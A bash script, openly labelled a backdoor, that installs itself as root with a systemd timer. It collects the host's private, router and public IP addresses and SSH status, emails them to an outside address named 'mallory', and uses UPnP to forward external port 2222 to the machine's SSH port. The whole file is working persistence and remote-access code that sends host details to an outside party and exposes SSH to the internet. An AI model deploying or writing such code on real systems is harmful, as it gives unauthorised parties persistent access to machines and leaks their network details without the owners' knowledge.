#!/bin/bash
# **WARNING** emails will probably end up in your spam folder!

# REQUIREMENTS for backdoor:
# * ip (for network scan)
# * curl (for network scan)
# * ipecho.net/plain website must be up (for network scan)
# * postfix or sendmail daemon running (for sending emails)
# * md5sum (for hashing of data)
# * miniupnp client (for upnp configuration)

#--------------------------BACKDOOR CONFIGURATION:-----------------------------------------------
backdoor=~/.backdoor # default -> root, change "User" in backdoor.service
emailaddress='mallory@example.ch'
sshservice='ssh.service' # archlinux -> sshd.service or sshd.socket, ubuntu -> ssh.service



#-------------------------------INSTALL FUNCTIONS:---------------------------------------------
function install # for installing the backdoor
{
[[ $EUID -ne 0 ]] && echo 'please run this script as root to install/uninstall.' && exit
echo 'installing...'
# Move files
sed -i -r "s/ssh.*/$sshservice/" backdoor.timer
cp backdoor.sh /usr/local/bin/
chmod +x /usr/local/bin/backdoor.sh
cp backdoor.service backdoor.timer /etc/systemd/system/ 
# Enable services
systemctl enable --now backdoor.timer
# Check
systemctl status $sshservice postfix backdoor.timer
systemctl list-timers
clear
echo 'done installing!'
exit
}
function uninstall # for removing the backdoor
{
[[ $EUID -ne 0 ]] && echo 'please run this script as root to install/uninstall.' && exit
echo 'uninstalling...'
# Disable services
systemctl disable --now backdoor.timer
# Remove files
rm /home/$(sed -r -n 's/^User=//p' /etc/systemd/system/backdoor.service)/.backdoor
rm /etc/systemd/system/backdoor* $backdoor /usr/local/bin/backdoor.sh
# Check
systemctl status $sshservice postfix backdoor.timer
systemctl list-timers
clear
echo 'done uninstalling! remember to check everything!'
exit
}



#-----------------------------MAIN FUNCTIONS:------------------------------------------------
function getdata # Gather Statistics
{
echo -e "IP PRIVATE\t   - $(ip route get 1 | sed -r -n 's/.*src ([0-9.:]+).*/\1/p')" # long live sed
echo -e "IP ROUTER\t    - $(ip route get 1 | sed -r -n 's/.*via ([0-9.:]+).*/\1/p')"
echo -e "IP PUBLIC\t    - $(curl -s ipecho.net/plain)" # -s kills progress output
systemctl | grep $sshservice &>/dev/null && ssh='ENABLED' || ssh='DISABLED'
echo -e "SSH\t          -> $ssh"
}

function run
{
# IF NETWORK IS DOWN, ABORT
ip route get 1 2>&1 | grep -i 'unreachable' &>/dev/null && exit # abort if down

# CHECK NETWORK OR SSH CHANGES
data=$(getdata)
[[ -f $backdoor ]] && oldhash=$(cat $backdoor) || oldhash="" # get hash value, if it exists
newhash=$(echo "$data" | md5sum) # hash network info
[[ $oldhash == $newhash ]] && exit

# NETWORK HAS CHANGED:
echo "$newhash" >$backdoor
# 1. send email because pub ip might have changed, or ssh is down
# (can verify with `mailq`)
echo -e "$(date)\n$data" | mail -s 'BACKDOOR' $emailaddress # requires postfix or sendmail daemon
# 2. update upnp mapping because priv ip might have changed (dhcp), or new network (pub ip change)
# (can verify with `upnpc -l`)
upnpc -d 2222 TCP # requires miniupnp
upnpc -r 22 2222 TCP
}



#------------------------------MAIN SCRIPT:-------------------------------------------
[[ $# -ne 1 ]] && echo -e "NO ACTION SELECTED! usage: $0 [install|uninstall|run]" && exit
[[ $1 == 'install' || $1 == 'uninstall' || $1 == 'run' ]] && $1
exit

